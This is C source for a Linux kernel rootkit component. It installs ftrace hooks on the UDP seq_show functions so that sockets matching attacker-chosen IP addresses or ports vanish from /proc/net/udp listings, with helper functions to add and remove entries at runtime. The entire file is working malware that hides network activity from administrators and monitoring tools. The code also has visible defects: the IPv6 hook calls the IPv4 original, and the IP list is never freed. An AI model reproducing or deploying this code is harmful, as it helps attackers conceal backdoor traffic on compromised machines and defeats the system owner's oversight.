#include "udp_seq_show.h"
#include "ftrace_helper.h"

int udp_port_size = 0;
int udp_ip_size = 0;

int *hidden_udp_ports;
int *hidden_udp_ips;

static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);

struct ftrace_hook hook_udp4_seq_show = HOOK("udp4_seq_show", malw_udp4_seq_show, &orig_udp4_seq_show);
struct ftrace_hook hook_udp6_seq_show = HOOK("udp6_seq_show", malw_udp6_seq_show, &orig_udp6_seq_show);


void add_hidden_udp_ip(char *str)
{
    int a, b, c, d;
    char arr[4];
    udp_ip_size++;
    hidden_udp_ips = krealloc(hidden_udp_ips, udp_ip_size*sizeof(int), GFP_KERNEL);

    sscanf(str, "%d.%d.%d.%d", &a, &b, &c, &d);
    arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;

    *(hidden_udp_ips + udp_ip_size - 1) = *(unsigned int *)arr;
}

void remove_hidden_udp_ip(char *str)
{
    int a, b, c, d;
    int i;
    int ip;
    char arr[4];
    int move = 0;

    sscanf(str, "%d.%d.%d.%d", &a, &b, &c, &d);
    arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;

    ip = *(unsigned int *)arr;

    for (i = 0; i < udp_ip_size; i++) {
        if (*(hidden_udp_ips + i) == ip) {
            move = 1;
            continue;
        }
        if (move) {
            *(hidden_udp_ips + i - 1) = *(hidden_udp_ips + i);
        }
    }
    if (udp_ip_size > 0 && move) {
        udp_ip_size--;
        hidden_udp_ips = krealloc(hidden_udp_ips, udp_ip_size*sizeof(int), GFP_KERNEL);
    }
}

void add_hidden_udp_port(int port)
{
    udp_port_size++;
    hidden_udp_ports = krealloc(hidden_udp_ports, udp_port_size*sizeof(int), GFP_KERNEL);
    *(hidden_udp_ports + udp_port_size - 1) = port;
}

void remove_hidden_udp_port(int port)
{
    int i;
    int move = 0;
    for (i = 0; i < udp_port_size; i++) {
        if (*(hidden_udp_ports + i) == port) {
            move = 1;
            continue;
        }
        if (move) {
            *(hidden_udp_ports + i - 1) = *(hidden_udp_ports + i);
        }
    }
    if (udp_port_size > 0 && move) {
        udp_port_size--;
        hidden_udp_ports = krealloc(hidden_udp_ports, udp_port_size*sizeof(int), GFP_KERNEL);
    }
}

void install_udp_seq_show_hook(void)
{
    fh_install_hook(&hook_udp4_seq_show);
    fh_install_hook(&hook_udp6_seq_show);
}

void remove_udp_seq_show_hook(void)
{
    fh_remove_hook(&hook_udp4_seq_show);
    fh_remove_hook(&hook_udp6_seq_show);
    kfree(hidden_udp_ports);
}

asmlinkage long malw_udp4_seq_show(struct seq_file *seq, void *v)
{
    int i;
    long ret;
    struct sock *sk = v;

    for (i = 0; i < udp_ip_size; i++) {
        if (sk != (struct sock *)0x1 && sk->sk_rcv_saddr && sk->sk_daddr) {
            if (sk->sk_rcv_saddr == *(hidden_udp_ips + i) || sk->sk_daddr == *(hidden_udp_ips + i)) {
                return 0;
            }
        }
    }


    for (i = 0; i < udp_port_size; i++) {
        if (sk != (struct sock *)0x1 && (sk->sk_num == *(hidden_udp_ports + i) || be16_to_cpu(sk->sk_dport) == *(hidden_udp_ports + i))) {
            return 0;
        }
    }

    ret = orig_udp4_seq_show(seq, v);
    return ret;
}

asmlinkage long malw_udp6_seq_show(struct seq_file *seq, void *v)
{
    int i;
    long ret;
    struct sock *sk = v;


    for (i = 0; i < udp_port_size; i++) {
        if (sk != (struct sock *)0x1 && (sk->sk_num == *(hidden_udp_ports + i) || be16_to_cpu(sk->sk_dport) == *(hidden_udp_ports + i))) {
            return 0;
        }
    }

    ret = orig_udp4_seq_show(seq, v);
    return ret;
}
